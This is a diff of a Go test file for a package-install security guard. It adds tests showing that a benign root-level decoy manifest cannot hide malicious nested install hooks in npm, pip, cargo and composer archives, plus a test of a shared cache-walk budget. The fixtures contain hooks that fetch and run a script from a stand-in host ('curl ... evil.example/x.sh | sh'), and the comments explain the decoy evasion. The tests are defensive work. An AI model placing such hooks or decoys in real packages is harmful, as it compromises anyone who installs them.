@@ -16,6 +16,8 @@ import (
 	"path/filepath"
 	"strings"
 	"testing"
+
+	"github.com/chain305/chainsaw-core/intelligence/artifactmap"
 )
 
 // makeTGZ builds an in-memory gzip+tar archive from path->contents, mimicking
@@ -79,6 +81,156 @@ func TestAnalyzeArtifact_NPMRemoteFetchInstallScript(t *testing.T) {
 	if !strings.Contains(v.Reason, "remote") {
 		t.Errorf("reason = %q, want it to mention remote", v.Reason)
 	}
+}
+
+// TestAnalyzeArtifact_RootDecoyManifestDoesNotMaskNestedMalicious pins the G4
+// fix: manifests resolve relative to the archive's single top-level directory —
+// the path the package manager actually extracts — not by path depth.
+//
+// The attack it blocks: an attacker publishes a tarball whose real, malicious
+// manifest sits where the package manager reads it (package/package.json) and
+// ALSO drops a benign copy at depth 0. npm's `strip:1` extract DISCARDS the
+// root-level entry, so it is invisible to npm — but the old shallowest-wins
+// resolution made it authoritative for the guard, blinding the entire
+// behavioral scan. Verified reproducible: the same malicious manifest blocks
+// without the decoy and passed with it.
+func TestAnalyzeArtifact_RootDecoyManifestDoesNotMaskNestedMalicious(t *testing.T) {
+	const (
+		evilPostinstall = `{"name":"evil","version":"1.0.0","scripts":{"postinstall":"curl -s http://evil.example/x.sh | sh"}}`
+		benignPkgJSON   = `{"name":"evil","version":"1.0.0","scripts":{"test":"jest"}}`
+		evilSetupPy     = "from setuptools import setup\nimport os\ncmdclass = {}\nos.system('curl -s http://evil.example/x.sh | sh')\nsetup(name='evil')\n"
+		benignSetupPy   = "from setuptools import setup\nsetup(name='evil', version='1.0.0')\n"
+		evilBuildRs     = "fn main() { std::process::Command::new(\"sh\").arg(\"-c\").arg(\"curl https://evil.example/x.sh | sh\").status().unwrap(); }\n"
+		benignBuildRs   = "fn main() { println!(\"cargo:rerun-if-changed=src/lib.rs\"); }\n"
+		evilComposer    = `{"name":"evil/pkg","scripts":{"post-install-cmd":["curl https://evil.example/x.sh | sh"]}}`
+		benignComposer  = `{"name":"evil/pkg","scripts":{"post-install-cmd":["phpunit"]}}`
+		cargoToml       = "[package]\nname = \"evil\"\nversion = \"1.0.0\"\nbuild = \"build.rs\"\n"
+	)
+
+	cases := []struct {
+		name      string
+		ecosystem string
+		// nested is the archive as the package manager sees it; decoy adds the
+		// depth-0 benign copy on top.
+		nested map[string]string
+		decoy  map[string]string
+		root   string // expected packageRoot of the decoy archive
+	}{
+		{
+			name:      "npm_package_json",
+			ecosystem: "npm",
+			nested:    map[string]string{"package/package.json": evilPostinstall},
+			decoy:     map[string]string{"package.json": benignPkgJSON},
+			root:      "package",
+		},
+		{
+			name:      "pypi_setup_py",
+			ecosystem: "pip",
+			nested:    map[string]string{"evil-1.0.0/setup.py": evilSetupPy},
+			decoy:     map[string]string{"setup.py": benignSetupPy},
+			root:      "evil-1.0.0",
+		},
+		{
+			name:      "cargo_build_rs",
+			ecosystem: "cargo",
+			nested: map[string]string{
+				"evil-1.0.0/Cargo.toml": cargoToml,
+				"evil-1.0.0/build.rs":   evilBuildRs,
+			},
+			decoy: map[string]string{"Cargo.toml": cargoToml, "build.rs": benignBuildRs},
+			root:  "evil-1.0.0",
+		},
+		{
+			name:      "composer_json",
+			ecosystem: "composer",
+			nested:    map[string]string{"evil-pkg-abc1234/composer.json": evilComposer},
+			decoy:     map[string]string{"composer.json": benignComposer},
+			root:      "evil-pkg-abc1234",
+		},
+	}
+
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			// Control: the malicious archive alone blocks.
+			if v := analyzeArtifact(tc.ecosystem, makeTGZ(t, tc.nested)); !v.Block {
+				t.Fatalf("control: malicious archive must block, got %+v", v)
+			}
+			// The decoy must not change that verdict.
+			withDecoy := map[string]string{}
+			for k, v := range tc.nested {
+				withDecoy[k] = v
+			}
+			for k, v := range tc.decoy {
+				withDecoy[k] = v
+			}
+			tgz := makeTGZ(t, withDecoy)
+			if v := analyzeArtifact(tc.ecosystem, tgz); !v.Block {
+				t.Fatalf("root-level decoy manifest masked the nested malicious one — got %+v", v)
+			}
+			// And the mechanism: the archive is single-rooted, so a depth-0
+			// entry is never eligible.
+			files := artifactmap.Build(tgz, artifactmap.Options{}).Files
+			if got := packageRoot(files); got != tc.root {
+				t.Fatalf("packageRoot = %q, want %q", got, tc.root)
+			}
+		})
+	}
+}
+
+// TestAnalyzeArtifact_MultiRootArchiveStillResolvesManifest is the twin of the
+// decoy test: archives with NO single top-level directory — a wheel (pkg/ plus
+// pkg-1.0.dist-info/) or a flat .gem-shaped tar — must keep resolving their
+// manifest via the shallowest-wins fallback. Anchoring to a package root is
+// only correct where a package root exists; over-tightening here would silently
+// drop behavioral coverage for every wheel.
+func TestAnalyzeArtifact_MultiRootArchiveStillResolvesManifest(t *testing.T) {
+	const evilSetupPy = "from setuptools import setup\nimport os\ncmdclass = {}\nos.system('curl -s http://evil.example/x.sh | sh')\nsetup(name='evil')\n"
+
+	t.Run("wheel_two_top_level_dirs", func(t *testing.T) {
+		// A .whl is a zip with the package dir AND a sibling .dist-info dir.
+		whl := makeZip(t, map[string]string{
+			"evilwheel/setup.py":                 evilSetupPy,
+			"evilwheel/__init__.py":              "x = 1\n",
+			"evilwheel-1.0.0.dist-info/METADATA": "Name: evilwheel\nVersion: 1.0.0\n",
+			"evilwheel-1.0.0.dist-info/RECORD":   "evilwheel/__init__.py,,\n",
+		})
+		files := artifactmap.Build(whl, artifactmap.Options{}).Files
+		if got := packageRoot(files); got != "" {
+			t.Fatalf("packageRoot on a two-root wheel = %q, want \"\" (no single extract root)", got)
+		}
+		if rootFileBytes(files, "setup.py") == nil {
+			t.Fatal("fallback failed to resolve setup.py in a multi-root archive")
+		}
+		if v := analyzeArtifact("pip", whl); !v.Block {
+			t.Fatalf("multi-root wheel with a malicious setup.py must still block, got %+v", v)
+		}
+	})
+
+	t.Run("flat_archive_depth_zero_manifest", func(t *testing.T) {
+		// A .gem-shaped archive keeps everything at depth 0 — there is no root
+		// to anchor to and the depth-0 manifest is the real one.
+		tgz := makeTGZ(t, map[string]string{"setup.py": evilSetupPy})
+		files := artifactmap.Build(tgz, artifactmap.Options{}).Files
+		if got := packageRoot(files); got != "" {
+			t.Fatalf("packageRoot on a flat archive = %q, want \"\"", got)
+		}
+		if v := analyzeArtifact("pip", tgz); !v.Block {
+			t.Fatalf("flat archive with a malicious depth-0 setup.py must block, got %+v", v)
+		}
+	})
+
+	t.Run("flat_archive_with_one_incidental_dir", func(t *testing.T) {
+		// The shape that makes "exclude every depth-0 entry" wrong: a flat
+		// composer package whose only directory is src/. The manifest lives at
+		// depth 0 and must still resolve.
+		tgz := makeTGZ(t, map[string]string{
+			"composer.json": `{"name":"evil/pkg","scripts":{"post-install-cmd":["curl https://evil.example/x.sh | sh"]}}`,
+			"src/Foo.php":   "<?php class Foo {}\n",
+		})
+		if v := analyzeArtifact("composer", tgz); !v.Block {
+			t.Fatalf("flat composer package with a src/ dir must still block, got %+v", v)
+		}
+	})
 }
 
 func TestAnalyzeArtifact_NPMClean(t *testing.T) {
@@ -433,6 +585,74 @@ func TestPipCacheArtifactBytes(t *testing.T) {
 	v := g.evaluate(context.Background(), packageSpec{Ecosystem: "pip", Name: "cached-pkg", Version: "1.2.3"})
 	if !v.Block {
 		t.Fatalf("guard must block a cached malicious wheel with no staging dir, got %+v", v)
+	}
+}
+
+// TestGuardCacheWalkBudgetIsProcessWide pins the G8 fix: the cacache fallback
+// walk's file/time allowance is shared across every spec in one invocation, not
+// re-allocated per call. Before the fix each spec got its own 4096-file /
+// 250ms budget, so a 200-package `npm ci` against a large cacache spent 30.36s
+// walking (vs 1.37s with no cache present).
+//
+// It also pins the accepted TRADEOFF: once the shared budget is spent, later
+// specs get no cache bytes and therefore no behavioral scan — fail-open, the
+// same as a cache miss.
+func TestGuardCacheWalkBudgetIsProcessWide(t *testing.T) {
+	// A synthetic cacache whose index shards are numerous enough that a single
+	// walk exhausts the file allowance. Entries are keyed on a NON-default
+	// registry so the O(1) shard lookup can never resolve them — only the
+	// fallback walk can, which is the path under test.
+	root := t.TempDir()
+	indexDir := filepath.Join(root, "_cacache", "index-v5")
+	const shards = 48
+	const perShard = 120 // 5,760 index files > guardCacheWalkMaxFiles
+	for i := 0; i < shards; i++ {
+		d := filepath.Join(indexDir, fmt.Sprintf("%02x", i), "ab")
+		if err := os.MkdirAll(d, 0o755); err != nil {
+			t.Fatal(err)
+		}
+		for j := 0; j < perShard; j++ {
+			key := fmt.Sprintf("make-fetch-happen:request-cache:http://registry.internal:4873/filler%d-%d/-/filler%d-%d-1.0.0.tgz", i, j, i, j)
+			line := fmt.Sprintf("deadbeef\t{\"key\":%q,\"integrity\":\"sha512-nope\"}\n", key)
+			if err := os.WriteFile(filepath.Join(d, fmt.Sprintf("e%d", j)), []byte(line), 0o644); err != nil {
+				t.Fatal(err)
+			}
+		}
+	}
+	t.Setenv("npm_config_cache", root)
+	t.Setenv(guardArtifactDirEnv, "")
+
+	guardCacheWalk.reset()
+	t.Cleanup(guardCacheWalk.reset)
+
+	const specs = 40
+	for i := 0; i < specs; i++ {
+		// Every one of these misses the O(1) lookup and falls through to the
+		// walk — the exact shape of a fresh `npm ci` against a private registry.
+		_ = npmCacheArtifactBytes(packageSpec{
+			Ecosystem: "npm",
+			Name:      fmt.Sprintf("absent-pkg-%d", i),
+			Version:   "1.0.0",
+		})
+	}
+
+	if got := guardCacheWalk.files(); got > guardCacheWalkMaxFiles {
+		t.Fatalf("%d specs read %d index files; the shared cap is %d — the budget is still per-call",
+			specs, got, guardCacheWalkMaxFiles)
+	}
+	if !guardCacheWalk.exhausted() {
+		t.Fatalf("expected the shared budget to be exhausted after %d walks over %d files (read %d)",
+			specs, shards*perShard, guardCacheWalk.files())
+	}
+	// The tradeoff, asserted rather than assumed: with the budget spent, a
+	// later walk returns nothing and the guard simply gets no bytes.
+	if got := findNpmCacheIntegrity(indexDir, "/-/filler0-0-1.0.0.tgz"); got != "" {
+		t.Fatalf("exhausted budget must yield no integrity (fail-open), got %q", got)
+	}
+	// A fresh invocation (new process, or an explicit reset) walks again.
+	guardCacheWalk.reset()
+	if got := findNpmCacheIntegrity(indexDir, "/-/filler0-0-1.0.0.tgz"); got != "sha512-nope" {
+		t.Fatalf("a fresh budget must find the entry, got %q", got)
 	}
 }
 
